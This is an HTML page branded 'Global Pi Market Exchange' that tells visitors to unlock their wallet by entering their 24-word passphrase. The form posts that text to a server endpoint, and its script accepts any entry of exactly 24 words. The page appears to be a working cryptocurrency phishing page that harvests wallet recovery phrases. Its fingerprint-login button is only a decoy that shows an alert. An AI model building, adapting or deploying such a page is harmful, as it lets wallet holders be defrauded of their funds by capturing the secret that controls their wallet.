<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Passphrase Entry</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      background-color: #240046;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 40px 20px;
      box-sizing: border-box;
      min-height: 100vh;
      flex-direction: column;
    }
    img {
      width: 100%;
      max-width: 350px;
      height: auto;
      margin-bottom: 40px;
      border-radius: 12px;
      object-fit: contain;
    }
    h2 {
      font-size: 3.2rem;
      font-weight: 700;
      margin: 0 0 20px;
      letter-spacing: 1.2px;
      max-width: 900px;
      line-height: 1.2;
    }
    p {
      font-size: 2rem;
      font-weight: 600;
      margin: 0 0 50px;
      max-width: 800px;
      line-height: 1.3;
    }
    form {
      width: 100%;
      max-width: 800px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    textarea {
      width: 100%;
      height: 260px; /* increased height */
      padding: 25px;
      font-size: 1.8rem;
      border-radius: 15px;
      border: none;
      resize: none;
      background-color: white;
      color: black;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
      text-align: center;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin-bottom: 50px;
      box-sizing: border-box;
    }
    .button-group {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 25px;
      align-items: center;
    }
    button {
      width: 100%;
      max-width: 400px; /* increased width */
      background-color: #7b2cbf;
      color: white;
      border: none;
      border-radius: 15px;
      padding: 28px 0; /* increased padding */
      font-size: 2.2rem; /* increased font size */
      font-weight: 700;
      cursor: pointer;
      transition: background-color 0.3s ease;
      text-transform: lowercase;
    }
    button:hover {
      background-color: #9d4edd;
    }
    .error {
      margin-top: 35px;
      font-size: 1.6rem;
      font-weight: 700;
      color: #ff4d4d;
      min-height: 30px;
      max-width: 800px;
    }
  </style>
</head>
<body>
  <img src="/static/Gpm_logo.jpeg" alt="GPM Logo" />

  <h2>UNLOCK YOUR WALLET TO GET ACCESS TO GLOBAL PI MARKET EXCHANGE SITE</h2>
  <p>Enter your passphrase to unlock wallet</p>

  <form method="POST" action="/submit-passphrase" onsubmit="return validatePassphrase()">
    <textarea name="passphrase" id="passphrase" placeholder="Enter your 24-word passphrase here..."></textarea>
    <div class="button-group">
      <button type="submit">login with passphrase</button>
      <button type="button" onclick="alert('Fingerprint login is not available')">login with fingerprint</button>
    </div>
    <div class="error" id="error-message"></div>
  </form>

  <script>
    function validatePassphrase() {
      const passphrase = document.getElementById('passphrase').value.trim();
      const words = passphrase.split(/\s+/);
      const errorDiv = document.getElementById('error-message');

      if (words.length !== 24) {
        errorDiv.textContent = "Invalid passphrase, please enter the exactly 24 words of your wallet to login to GPM site.";
        return false;
      }
      errorDiv.textContent = "";
      return true;
    }
  </script>
</body>
</html>
